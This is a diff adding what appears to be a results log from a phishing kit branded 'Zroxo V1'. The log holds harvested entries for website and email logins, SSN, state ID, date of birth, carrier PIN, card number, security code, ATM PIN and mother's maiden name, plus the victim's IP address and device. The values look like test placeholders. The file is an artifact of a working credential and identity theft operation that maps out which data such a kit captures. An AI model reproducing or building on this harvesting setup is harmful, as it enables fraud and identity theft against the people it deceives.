@@ -1,0 +1,81 @@
++ --------------[ INFO LOGIN PAGE ]---------------+
+[Username]: username
+[password]: password
+
++ --------------[ LOGIN PAGE ]---------------+
+[Username]: username
+[Password]: password
++ --------------[ INFO EMAIL POPUP PAGE ]---------------+
+[Email]: email@gmail.com
+[Password]: emailpass
++ --------------[ INFO VERIFY PAGE ]---------------+
+[Firstname]: F name
+[Lastname]: L name
+[DateOFbirth]: 2022-03-01
+[SSN]: 123-45-6789
+[STATEID]: 123321123321
+[ISSuingSTate]: California
+[Address1]: 12 block
+[Address2]: 
+[ZipCode]: 10005
+[City]: 
+[State]: 
+[Ph0neNumber]: (324) 638 6386
+[CarrierPin]: 3476
+[CarrierName]: 
+[RouTingNumber]: 
+[BranchNumber]: 
++ --------------[ Zroxo ip ]---------------+
+IP Address: 157.38.217.240
+City: 
+OS/Browser: Handheld Browser
+Time: 14/03/2022 09:34:12am
+User Agent: Android
++ --------------[ Zroxo V1 ]---------------+
++ --------------[ INFO LOGIN PAGE ]---------------+
+[Username]: username
+[password]: password
+
++ --------------[ LOGIN PAGE ]---------------+
+[Username]: username
+[Password]: password
++ --------------[ INFO EMAIL POPUP PAGE ]---------------+
+[Email]: email@gmail.com
+[Password]: emailpass
++ --------------[ INFO VERIFY PAGE ]---------------+
+[Firstname]: F name
+[Lastname]: L name
+[DateOFbirth]: 2022-03-01
+[SSN]: 123-45-6789
+[STATEID]: 123321123321
+[ISSuingSTate]: California
+[Address1]: 12 block
+[Address2]: 
+[ZipCode]: 10005
+[City]: 
+[State]: 
+[Ph0neNumber]: (324) 638 6386
+[CarrierPin]: 3476
+[CarrierName]: 
+[RouTingNumber]: 
+[BranchNumber]: 
+
++ --------------[ LOGIN PAGE ]---------------+
+[Username]: username
+[Password]: password
++ --------------[ INFO EMAIL POPUP PAGE ]---------------+
+[Email]: email@gmail.com
+[Password]: emailpass
++ --------------[ INFO CC VERIFY PAGE ]---------------+
+[Card Number]: 57338374747
+[Expiration date]: 12/4444
+[Security code]: 677
+[Atm pin]: 1234
+[Mmn]: M name
++ --------------[ Zroxo ip ]---------------+
+IP Address: 157.38.217.240
+City: 
+OS/Browser: Handheld Browser
+Time: 14/03/2022 09:34:42am
+User Agent: Android
++ --------------[ Zroxo V1 ]---------------+
